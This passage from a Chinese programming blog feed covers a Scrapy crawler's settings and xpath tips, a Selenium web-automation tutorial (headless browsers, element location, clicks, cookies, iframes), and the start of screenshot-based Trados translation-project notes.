class="comment">#TELNETCONSOLE_ENABLED = False</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Override the default request headers:</span></span><br><span class="line"><span class="comment">#DEFAULT_REQUEST_HEADERS = &#123;</span></span><br><span class="line"><span class="comment">#   &#x27;Accept&#x27;: &#x27;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#x27;,</span></span><br><span class="line"><span class="comment">#   &#x27;Accept-Language&#x27;: &#x27;en&#x27;,</span></span><br><span class="line"><span class="comment">#&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Enable or disable spider middlewares</span></span><br><span class="line"><span class="comment"># See https://docs.scrapy.org/en/latest/topics/spider-middleware.html</span></span><br><span class="line"><span class="comment">#SPIDER_MIDDLEWARES = &#123;</span></span><br><span class="line"><span class="comment">#    &#x27;yg.middlewares.YgSpiderMiddleware&#x27;: 543,</span></span><br><span class="line"><span class="comment">#&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Enable or disable downloader middlewares</span></span><br><span class="line"><span class="comment"># See https://docs.scrapy.org/en/latest/topics/downloader-middleware.html</span></span><br><span class="line"><span class="comment">#DOWNLOADER_MIDDLEWARES = &#123;</span></span><br><span class="line"><span class="comment">#    &#x27;yg.middlewares.YgDownloaderMiddleware&#x27;: 543,</span></span><br><span class="line"><span class="comment">#&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Enable or disable extensions</span></span><br><span class="line"><span class="comment"># See https://docs.scrapy.org/en/latest/topics/extensions.html</span></span><br><span class="line"><span class="comment">#EXTENSIONS = &#123;</span></span><br><span class="line"><span class="comment">#    &#x27;scrapy.extensions.telnet.TelnetConsole&#x27;: None,</span></span><br><span class="line"><span class="comment">#&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Configure item pipelines</span></span><br><span class="line"><span class="comment"># See https://docs.scrapy.org/en/latest/topics/item-pipeline.html</span></span><br><span class="line"><span class="comment">#ITEM_PIPELINES = &#123;</span></span><br><span class="line"><span class="comment">#    &#x27;yg.pipelines.YgPipeline&#x27;: 300,</span></span><br><span class="line"><span class="comment">#&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Enable and configure the AutoThrottle extension (disabled by default)</span></span><br><span class="line"><span class="comment"># See https://docs.scrapy.org/en/latest/topics/autothrottle.html</span></span><br><span class="line"><span class="comment">#AUTOTHROTTLE_ENABLED = True</span></span><br><span class="line"><span class="comment"># The initial download delay</span></span><br><span class="line"><span class="comment">#AUTOTHROTTLE_START_DELAY = 5</span></span><br><span class="line"><span class="comment"># The maximum download delay to be set in case of high latencies</span></span><br><span class="line"><span class="comment">#AUTOTHROTTLE_MAX_DELAY = 60</span></span><br><span class="line"><span class="comment"># The average number of requests Scrapy should be sending in parallel to</span></span><br><span class="line"><span class="comment"># each remote server</span></span><br><span class="line"><span class="comment">#AUTOTHROTTLE_TARGET_CONCURRENCY = 1.0</span></span><br><span class="line"><span class="comment"># Enable showing throttling stats for every response received:</span></span><br><span class="line"><span class="comment">#AUTOTHROTTLE_DEBUG = False</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Enable and configure HTTP caching (disabled by default)</span></span><br><span class="line"><span class="comment"># See https://docs.scrapy.org/en/latest/topics/downloader-middleware.html#httpcache-middleware-settings</span></span><br><span class="line"><span class="comment">#HTTPCACHE_ENABLED = True</span></span><br><span class="line"><span class="comment">#HTTPCACHE_EXPIRATION_SECS = 0</span></span><br><span class="line"><span class="comment">#HTTPCACHE_DIR = &#x27;httpcache&#x27;</span></span><br><span class="line"><span class="comment">#HTTPCACHE_IGNORE_HTTP_CODES = []</span></span><br><span class="line"><span class="comment">#HTTPCACHE_STORAGE = &#x27;scrapy.extensions.httpcache.FilesystemCacheStorage&#x27;</span></span><br></pre></td></tr></table></figure>
<h2 id="爬取结果"><a href="#爬取结果" class="headerlink" title="爬取结果"></a>爬取结果</h2><p><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gc34tbb08pj31f60u04k5.jpg" alt="image.png"></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p><code>allow=r&#39;/index.php/question/report\?page=\d+&#39;</code>正则表达式中，<code>?</code>要做转义处理。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">item[<span class="string">&quot;content&quot;</span>] = response.xpath(<span class="string">&quot;//div[@class=&#x27;wzy1&#x27;][1]/table[2]/tr[1]/td[1]//text()&quot;</span>).extract()</span><br><span class="line">item[<span class="string">&quot;content&quot;</span>] = [re.sub(<span class="string">r&quot;\xa0|\s|\r\n&quot;</span>, <span class="string">&quot;&quot;</span>,i) <span class="keyword">for</span> i <span class="keyword">in</span> item[<span class="string">&quot;content&quot;</span>]] <span class="comment">#去除\xa0和空格，美化输出格式</span></span><br><span class="line">item[<span class="string">&quot;content&quot;</span>] = [i <span class="keyword">for</span> i <span class="keyword">in</span> item[<span class="string">&quot;content&quot;</span>] <span class="keyword">if</span> <span class="built_in">len</span>(item[<span class="string">&quot;content&quot;</span>]) &gt; <span class="number">0</span>] <span class="comment">#去掉空元素</span></span><br></pre></td></tr></table></figure>
<p>这段代码是对问题反映的内容做格式化处理，去掉\xa0、空格、列表空元素。<br><code>&quot;//div[@class=&#39;wzy1&#39;][1]/table[2]/tr[1]/td[1]//text()&quot;</code>这句xpath有个新知识在里面，相同属性的标签如果有多个，我们可以按照标签的顺序进行提取。比如这里的<code>div[@class=&#39;wzy1&#39;][1]</code>就表示<code>class=&#39;wzy1&#39;</code>的第一个div标签。<br><code>response.xpath(&quot;xpath语句&quot;).get()</code>这个方法也可以提取xpath定位到的内容。</p>
]]></content>
      <categories>
        <category>python爬虫实例</category>
        <category>scrapy框架爬虫</category>
      </categories>
      <tags>
        <tag>scrapy爬虫实例</tag>
        <tag>用crawl spider爬取阳光政务网</tag>
      </tags>
  </entry>
  <entry>
    <title>selenium模块实现web自动化测试</title>
    <url>//posts/ZH-CN/Selenium_Web_Automation.html</url>
    <content><![CDATA[<h2 id="什么是selenium"><a href="#什么是selenium" class="headerlink" title="什么是selenium"></a>什么是selenium</h2><p>Selenium是一个Web的自动化测试工具，最初是为网站自动化测试而开发的，Selenium可以直接运行在浏览器上，它支持所有主流的浏览器（包括PhantomJS这些无界面的浏览器），可以接收指令，让浏览器自动加载页面，获取需要的数据，甚至页面截屏。<br><a href="https://zhuanlan.zhihu.com/p/41235936">这里是个有趣的解释</a></p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="什么是无头浏览器"><a href="#什么是无头浏览器" class="headerlink" title="什么是无头浏览器"></a>什么是无头浏览器</h2><blockquote>
<p>A headless browser is a web browser without a graphical user interface.</p>
</blockquote>
<p>这是维基百科的解释。意思就是没有图形界面的浏览器。</p>
<blockquote>
<p>Headless browsers provide automated control of a web page in an environment similar to popular web browsers, but are executed via a command-line interface or using network communication. They are particularly useful for testing web pages as they are able to render and understand HTML the same way a browser would, including styling elements such as page layout, colour, font selection and execution of JavaScript and AJAX which are usually not available when using other testing methods.</p>
</blockquote>
<p>以命令行接口或者网络通信的方式驱动浏览器，主要用于网页测试。<br><a href="https://www.zhihu.com/question/314668782">参考这些网友的知乎回答</a></p>
<h2 id="selenium模块基本用法"><a href="#selenium模块基本用法" class="headerlink" title="selenium模块基本用法"></a>selenium模块基本用法</h2><h3 id="使用webdriver模块驱动phantomjs无头浏览器"><a href="#使用webdriver模块驱动phantomjs无头浏览器" class="headerlink" title="使用webdriver模块驱动phantomjs无头浏览器"></a>使用webdriver模块驱动phantomjs无头浏览器</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"></span><br><span class="line">driver = webdriver.PhantomJS(<span class="string">r&quot;E:\phantomjs-2.1.1-windows\phantomjs-2.1.1-windows\bin\phantomjs.exe&quot;</span>) <span class="comment">#实例化一个driver</span></span><br><span class="line">driver.get(<span class="string">&quot;http://www.baidu.com&quot;</span>) <span class="comment">#发送请求</span></span><br><span class="line">driver.save_screenshot(<span class="string">&quot;15.png&quot;</span>) <span class="comment">#保存截图</span></span><br></pre></td></tr></table></figure>
<p>webdriver生成截图保存到本地。<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gbw6o1o0fnj31el0ieq6x.jpg" alt="image.png"></p>
<hr>
<p><code>driver = webdriver.PhantomJS(r&quot;E:\phantomjs-2.1.1-windows\phantomjs-2.1.1-windows\bin\phantomjs.exe&quot;)</code>这一句里面，<code>r</code>的作用是去除转义影响，避免了对windows路径里面的<code>\</code>作转义的麻烦。</p>
<h3 id="使用webdriver模块驱动chromdriver无头浏览器"><a href="#使用webdriver模块驱动chromdriver无头浏览器" class="headerlink" title="使用webdriver模块驱动chromdriver无头浏览器"></a>使用webdriver模块驱动chromdriver无头浏览器</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"></span><br><span class="line">driver = webdriver.Chrome(<span class="string">r&quot;E:\chromedriver_win32\chromedriver.exe&quot;</span>) <span class="comment">#实例化一个driver</span></span><br><span class="line">driver.get(<span class="string">&quot;http://www.baidu.com&quot;</span>) <span class="comment">#发送请求</span></span><br><span class="line">driver.save_screenshot(<span class="string">&quot;14.png&quot;</span>) <span class="comment">#保存截图</span></span><br></pre></td></tr></table></figure>
<p>因为我本地下载了chromdriver，对应的版本和我电脑上chrom浏览器的版本一致，所以这个程序运行时，可以看到浏览器运行的界面和过程，像这样。<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gbw6tdj833j31010t4n16.jpg" alt="image.png"></p>
<hr>
<p>我对应下载的chromedriver<a href="https://npm.taobao.org/mirrors/chromedriver/80.0.3987.106/">下载地址</a><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gbw6xz6lezj31cr0f0tas.jpg" alt="image.png"></p>
<h3 id="定位和操作"><a href="#定位和操作" class="headerlink" title="定位和操作"></a>定位和操作</h3><ul>
<li><p>定位<br><code>driver.find_element_by_id(&quot;kw&quot;).send_keys(&quot;python&quot;)</code>这是通过id进行定位。<br>还可以通过xpath定位，例如：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">driver = webdriver.Chrome(<span class="string">r&quot;E:\chromedriver_win32\chromedriver.exe&quot;</span>) <span class="comment">#实例化一个driver</span></span><br><span class="line">driver.get(<span class="string">&quot;http://www.baidu.com&quot;</span>) <span class="comment">#发送请求</span></span><br><span class="line">driver.find_element_by_xpath(<span class="string">&quot;//input[@class=&#x27;s_ipt&#x27;]&quot;</span>).send_keys(<span class="string">&quot;hello&quot;</span>)</span><br></pre></td></tr></table></figure>
<p><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gbw8bvexc0j31f60u0n3x.jpg" alt="image.png"></p>
</li>
<li><p>模拟输入行为</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">driver = webdriver.Chrome(<span class="string">r&quot;E:\chromedriver_win32\chromedriver.exe&quot;</span>) <span class="comment">#实例化一个driver</span></span><br><span class="line">driver.get(<span class="string">&quot;http://www.baidu.com&quot;</span>) <span class="comment">#发送请求</span></span><br><span class="line">driver.find_element_by_id(<span class="string">&quot;kw&quot;</span>).send_keys(<span class="string">&quot;python&quot;</span>) <span class="comment">#定位到id为kw的元素，输入python</span></span><br><span class="line">time.sleep(<span class="number">2</span>) <span class="comment">#睡两秒</span></span><br><span class="line">driver.quit() <span class="comment">#退出浏览器</span></span><br></pre></td></tr></table></figure>
<p><code>driver.find_element_by_id(&quot;kw&quot;).send_keys(&quot;python&quot;)</code>这个意思是找到id为kw的元素，输入搜索词<code>python</code>。<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gbw714w1drj31010t4jwg.jpg" alt="image.png"><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gbw758lcz9j31010t4jsl.jpg" alt="image.png"></p>
</li>
</ul>
<hr>
<p><code>driver.quit()</code>：退出浏览器<br><code>driver.close()</code>：退出浏览器当前页面</p>
<ul>
<li><p>模拟点击行为</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">driver = webdriver.Chrome(<span class="string">r&quot;E:\chromedriver_win32\chromedriver.exe&quot;</span>) <span class="comment">#实例化一个driver</span></span><br><span class="line">driver.get(<span class="string">&quot;http://www.baidu.com&quot;</span>) <span class="comment">#发送请求</span></span><br><span class="line">driver.find_element_by_id(<span class="string">&quot;kw&quot;</span>).send_keys(<span class="string">&quot;python&quot;</span>) <span class="comment">#定位到id为kw的元素，输入python</span></span><br><span class="line">driver.find_element_by_id(<span class="string">&quot;su&quot;</span>).click() <span class="comment">#定位到id为su的元素，做点击操作</span></span><br><span class="line">time.sleep(<span class="number">2</span>) <span class="comment">#睡两秒</span></span><br></pre></td></tr></table></figure>
<p><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gbw7aoc8e5j31010t4mzo.jpg" alt="image.png"></p>
</li>
<li><p>获取cookie</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">driver = webdriver.Chrome(<span class="string">r&quot;E:\chromedriver_win32\chromedriver.exe&quot;</span>) <span class="comment">#实例化一个driver</span></span><br><span class="line">driver.get(<span class="string">&quot;http://www.baidu.com&quot;</span>) <span class="comment">#发送请求</span></span><br><span class="line">driver.find_element_by_id(<span class="string">&quot;kw&quot;</span>).send_keys(<span class="string">&quot;python&quot;</span>) <span class="comment">#定位到id为kw的元素，输入python</span></span><br><span class="line">driver.find_element_by_id(<span class="string">&quot;su&quot;</span>).click() <span class="comment">#定位到id为su的元素，做点击操作</span></span><br><span class="line">cookies = driver.get_cookies() <span class="comment">#获取cookies</span></span><br><span class="line"><span class="built_in">print</span>(cookies) <span class="comment">#打印的结果是一个列表，列表元素为字典</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;*&quot;</span>*<span class="number">100</span>)</span><br><span class="line">cookies = &#123;i[<span class="string">&quot;name&quot;</span>]:i[<span class="string">&quot;value&quot;</span>] <span class="keyword">for</span> i <span class="keyword">in</span> cookies&#125; <span class="comment">#利用列表推导式，将列表转换为字典</span></span><br><span class="line"><span class="built_in">print</span>(cookies) <span class="comment">#打印结果是一个字典，这个字典就是cookies的键值对</span></span><br></pre></td></tr></table></figure>
<p>程序运行结果：<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gbw7q7qby3j31f60u0tdi.jpg" alt="image.png"></p>
</li>
</ul>
<h3 id="获取页面源码"><a href="#获取页面源码" class="headerlink" title="获取页面源码"></a>获取页面源码</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">driver = webdriver.Chrome(<span class="string">r&quot;E:\chromedriver_win32\chromedriver.exe&quot;</span>) <span class="comment">#实例化一个driver</span></span><br><span class="line">driver.get(<span class="string">&quot;http://www.baidu.com&quot;</span>) <span class="comment">#发送请求</span></span><br><span class="line">driver.find_element_by_id(<span class="string">&quot;kw&quot;</span>).send_keys(<span class="string">&quot;python&quot;</span>) <span class="comment">#定位到id为kw的元素，输入python</span></span><br><span class="line">driver.find_element_by_id(<span class="string">&quot;su&quot;</span>).click() <span class="comment">#定位到id为su的元素，做点击操作</span></span><br><span class="line">page_source = driver.page_source</span><br><span class="line"><span class="built_in">print</span>(page_source)</span><br></pre></td></tr></table></figure>
<p>程序运行结果：<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gbw7tktjmsj31f60u0tek.jpg" alt="image.png"></p>
<h3 id="获取当前url"><a href="#获取当前url" class="headerlink" title="获取当前url"></a>获取当前url</h3><p>比如，我们可以获取到点击【百度一下】这个按钮时对应的url。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">driver = webdriver.Chrome(<span class="string">r&quot;E:\chromedriver_win32\chromedriver.exe&quot;</span>) <span class="comment">#实例化一个driver</span></span><br><span class="line">driver.get(<span class="string">&quot;http://www.baidu.com&quot;</span>) <span class="comment">#发送请求</span></span><br><span class="line">driver.find_element_by_id(<span class="string">&quot;kw&quot;</span>).send_keys(<span class="string">&quot;python&quot;</span>) <span class="comment">#定位到id为kw的元素，输入python</span></span><br><span class="line">driver.find_element_by_id(<span class="string">&quot;su&quot;</span>).click() <span class="comment">#定位到id为su的元素，做点击操作</span></span><br><span class="line">current_url = driver.current_url</span><br><span class="line"><span class="built_in">print</span>(current_url)</span><br></pre></td></tr></table></figure>
<p>程序运行结果：<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gbw82ta4p1j31f60u078j.jpg" alt="image.png"></p>
<ul>
<li>find_element和find_elements的区别<br><code>find_element</code>返回一个元素，如果没有结果则报错<br><code>find_elements</code>返回一个列表，如果没有结果则返回空列表<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gbw908pw95j31f60u078g.jpg" alt="image.png"><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gbw91h0kdkj31f60u0tcw.jpg" alt="image.png"><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gbw9yl4kyyj31f60u07a3.jpg" alt="image.png"><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gbw9wp4lsnj31f60u0djs.jpg" alt="image.png"></li>
</ul>
<p>获取标签的文本内容，要使用.text方法。<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gbw9a94dp6j31f60u0ajf.jpg" alt="image.png"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">driver = webdriver.Chrome(<span class="string">r&quot;E:\chromedriver_win32\chromedriver.exe&quot;</span>) <span class="comment">#实例化一个driver</span></span><br><span class="line">driver.get(<span class="string">&quot;https://bh.sb/&quot;</span>) <span class="comment">#发送请求</span></span><br><span class="line">result1 = driver.find_elements_by_xpath(<span class="string">&quot;//div[@class=&#x27;content&#x27;]/article&quot;</span>)</span><br><span class="line"><span class="comment"># print(result1) #返回的是列表</span></span><br><span class="line"><span class="keyword">for</span> article <span class="keyword">in</span> result1:</span><br><span class="line">    result2 = article.find_element_by_xpath(<span class="string">&quot;./p[@class=&#x27;note&#x27;]&quot;</span>).text</span><br><span class="line">    <span class="built_in">print</span>(result2)</span><br></pre></td></tr></table></figure>
<p>程序运行结果：<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gbw8x3qd6yj31f60u0ahs.jpg" alt="image.png"></p>
<hr>
<p>by_xpath中获取属性和文本需要使用get_attribute() 和.text<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gbw98ilrhvj31f60u0ajb.jpg" alt="image.png"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">driver = webdriver.Chrome(<span class="string">r&quot;E:\chromedriver_win32\chromedriver.exe&quot;</span>) <span class="comment">#实例化一个driver</span></span><br><span class="line">driver.get(<span class="string">&quot;https://bh.sb/&quot;</span>) <span class="comment">#发送请求</span></span><br><span class="line">result1 = driver.find_elements_by_xpath(<span class="string">&quot;//div[@class=&#x27;content&#x27;]/article&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> article <span class="keyword">in</span> result1:</span><br><span class="line">    result2 = article.find_element_by_xpath(<span class="string">&quot;./p[@class=&#x27;focus&#x27;]/a&quot;</span>).get_attribute(<span class="string">&quot;href&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(result2)</span><br></pre></td></tr></table></figure>
<p>程序运行结果：<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gbw97dy8j1j31f60u0dl4.jpg" alt="image.png"></p>
<ul>
<li><p>获取文本对应的url链接<br><code>find_element_by_link_text</code>：文本内容全包含<br><code>find_element_by_partial_link_text</code>：文本内容部分包含<br>举例：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">driver = webdriver.Chrome(<span class="string">r&quot;E:\chromedriver_win32\chromedriver.exe&quot;</span>) <span class="comment">#实例化一个driver</span></span><br><span class="line">driver.get(<span class="string">&quot;https://www.baidu.com/s?ie=utf-8&amp;f=8&amp;rsv_bp=1&amp;rsv_idx=1&amp;tn=baidu&amp;wd=python&amp;rsv_pq=cf780276001c69b1&amp;rsv_t=b63boxEoUd2mj3Cb6CKdi%2B%2BKLueLrf4Ba7bChU%2BVNKhUuiCvKToE2IaMhQU&amp;rqlang=cn&amp;rsv_enter=0&amp;rsv_dl=tb&amp;rsv_sug3=6&amp;inputT=189&amp;rsv_sug4=189&quot;</span>) <span class="comment">#发送请求</span></span><br><span class="line">link = driver.find_element_by_partial_link_text(<span class="string">&quot;下一页&quot;</span>).get_attribute(<span class="string">&quot;href&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(link)</span><br></pre></td></tr></table></figure>
<p>程序运行结果：<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gbw9qu8piij31f60u0tct.jpg" alt="image.png"></p>
</li>
<li><p>定位iframe中的内容<br>直接定位iframe中的内容，程序会报错：<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gbwa7l2jb8j31f60u0tee.jpg" alt="image.png"><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gbwa6436zpj31f60u0jwp.jpg" alt="image.png"><br>我们定位iframe中的内容，需要先切换到iframe。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">driver = webdriver.Chrome(<span class="string">r&quot;E:\chromedriver_win32\chromedriver.exe&quot;</span>) <span class="comment">#实例化一个driver</span></span><br><span class="line">driver.get(<span class="string">&quot;https://mail.qq.com/&quot;</span>) <span class="comment">#发送请求</span></span><br><span class="line"><span class="comment"># driver.switch_to.frame(&quot;login_frame&quot;) #这两种方法都可以切换到iframe</span></span><br><span class="line">driver.switch_to_frame(<span class="string">&quot;login_frame&quot;</span>) <span class="comment">#这是根据iframe的id来定位iframe的</span></span><br><span class="line">driver.find_element_by_id(<span class="string">&quot;u&quot;</span>).send_keys(<span class="string">&quot;123456&quot;</span>)</span><br></pre></td></tr></table></figure>
<h3 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h3><p>如果网站采用了动态html技术，那么页面上的部分元素出现时间便不能确定，这个时候就可以设置一个等待时间，强制要求在时间内出现，否则报错。<br>举例：<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gbwb5s48toj31f60u042j.jpg" alt="image.png"><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gbwb4paqmij31f60u043k.jpg" alt="image.png"><br>代码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">driver = webdriver.Chrome(<span class="string">r&quot;E:\chromedriver_win32\chromedriver.exe&quot;</span>) <span class="comment">#实例化一个driver</span></span><br><span class="line">driver.get(<span class="string">&quot;https://www.bilibili.com/v/kichiku/mad/?spm_id_from=333.5.b_7375626e6176.3#/&quot;</span>) <span class="comment">#发送请求</span></span><br><span class="line">driver.find_element_by_xpath(<span class="string">&quot;//button[@class=&#x27;nav-btn iconfont icon-arrowdown3&#x27;]&quot;</span>).click() <span class="comment">#定位【下一页】按钮，并点击</span></span><br><span class="line">time.sleep(<span class="number">3</span>) <span class="comment">#睡3秒</span></span><br><span class="line">result = driver.find_elements_by_xpath(<span class="string">&quot;//ul[@class=&#x27;vd-list mod-2&#x27;]/li//a[@class=&#x27;title&#x27;]&quot;</span>) <span class="comment">#提取这一页的内容</span></span><br><span class="line"><span class="keyword">for</span> title <span class="keyword">in</span> result:</span><br><span class="line">    <span class="built_in">print</span>(title.text)</span><br><span class="line">driver.quit()</span><br></pre></td></tr></table></figure>

</li>
</ul>
]]></content>
      <categories>
        <category>基础知识大漫灌</category>
      </categories>
      <tags>
        <tag>python爬虫</tag>
        <tag>web自动化测试</tag>
        <tag>selenium模块</tag>
        <tag>无头浏览器</tag>
      </tags>
  </entry>
  <entry>
    <title>trados学习之创建翻译项目</title>
    <url>//posts/ZH-CN/create-translation-project.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本文记录trados练习过程，第一步：创建翻译项目。</p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="整体步骤"><a href="#整体步骤" class="headerlink" title="整体步骤"></a>整体步骤</h2><p><img src="https://v2ray.dana5haw.com:8008/images/2020/12/01/3accb7abaa8577dc4d27dda45ae65fcc.png" alt="3accb7abaa8577dc4d27dda45ae65fcc.png"></p>
<h2 id="创建项目，添加待翻译文件"><a href="#创建项目，添加待翻译文件" class="headerlink" title="创建项目，添加待翻译文件"></a>创建项目，添加待翻译文件</h2><p><img src="https://v2ray.dana5haw.com:8008/images/2020/12/01/image.png" alt="image.png"><br><img src="https://v2ray.dana5haw.com:8008/images/2020/12/01/image3402c1c7f47ef04e.png" alt="image3402c1c7f47ef04e.png"><br><img src="https://v2ray.dana5haw.com:8008/images/2020/12/01/imaged5b574ebdd9a0cfc.png" alt="imaged5b574ebdd9a0cfc.png"></p>
<h2 id="创建翻译记忆库"><a href="#创建翻译记忆库" class="headerlink" title="创建翻译记忆库"></a>创建翻译记忆库</h2><p><img src="https://v2ray.dana5haw.com:8008/images/2020/12/01/image8d96ecae2f99fe21.png" alt="image8d96ecae2f99fe21.png"><br><img src="https://v2ray.dana5haw.com:8008/images/2020/12/01/image3267f627ea678365.png" alt="image3267f627ea678365.png"><br><img src="https://v2ray.dana5haw.com:8008/images/2020/12/01/imageea6c807c89bd5d50.png" alt="imageea6c807c89bd5d50.png"></p>
<h2 id="multiterm创建术语库"><a href="#multiterm创建术语库" class="headerlink" title="multiterm创建术语库"></a>multiterm创建术语库</h2><p><img src="https://v2ray.dana5haw.com:8008/images/2020/12/01/imageb11453131878020c.png" alt="imageb11453131878020c.png"><br><img src="https://v2ray.dana5haw.com:8008/images/2020/12/01/imagebbeed61da04c0f51.png" alt="imagebbeed61da04c0f51.png"><br><img src="https://v2ray.dana5haw.com:8008/images/2020/12/01/image7c1376f89f84cf33.png" alt="image7c1376f89f84cf33.png"><br><img src="https://v2ray.dana5haw.com:8008/images/2020/12/01/image4d970f2c71a0d367.png" alt="image4d970f2c71a0d367.png"><br><img src="https://v2ray.dana5haw.com:8008/images/2020/12/01/image3d489099da083a2a.png" alt="image3d489099da083a2a.png"><br><img src="https://v2ray.dana5haw.com:8008/images/2020/12/01/image1c54117a08bff337.png" alt="image1c54117a08bff337.png"><br><img src="https://v2ray.dana5haw.com:8008/images/2020/12/01/imagec7a7127bbb2b3312.png" alt="imagec7a7127bbb2b3312.png"></p>
<h2 id="studio添加刚刚创建的术语库"><a href="#studio添加刚刚创建的术语库" class="headerlink" title="studio添加刚刚创建的术语库"></a>studio添加刚刚创建的术语库</h2><p><img src="https://v2ray.dana5haw.com:8008/images/2020/12/01/image9eedfa53b48f08d2.png" alt="image9eedfa53b48f08d2.png"><br><img src="https://v2ray.dana5haw.com:8008/images/2020/12/01/image5198e773bf220d00.png" alt="image5198e773bf220d00.png"><br><img src="https://v2ray.dana5haw.com:8008/images/2020/12/01/image55fb53753e6e7fd8.png" alt="image55fb53753e6e7fd8.png"></p>
<h2 id="文件视图勾选包含子文件夹"><a href="#文件视图勾选包含子文件夹" class="headerlink" title="文件视图勾选包含子文件夹"></a>文件视图勾选包含子文件夹</h2><p><img src="https://v2ray.dana5haw.com:8008/images/2020/12/01/imageb63e3cc51338718a.png" alt="imageb63e3cc51338718a.png"></p>
<h2 id="测试待翻译文件是否能正常输出"><a href="#测试待翻译文件是否能正常输出" class="headerlink" title="测试待翻译文件是否能正常输出"></a>测试待翻译文件是否能正常输出</h2><p><img src="https://v2ray.dana5haw.com:8008/images/2020/12/01/image497b06682e36d738.png" alt="image497b06682e36d738.png"><br><img src="https://v2ray.dana5haw.com:8008/images/2020/12/01/image2e39a94442831436.png" alt="image2e39a94442831436.png"></p>
]]></content>
      <categories>
        <category>trados</category>
      </categories>
      <tags>
        <tag>trados</tag>
      </tags>
  </entry>
  <entry>
    <title>trados学习之翻译编辑</title>
    <url>//posts/ZH-CN/edit-translation.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本文记录trados练习过程，第二步：翻译编辑。</p>
<p><escape> <span id="more"></span></escape></p>
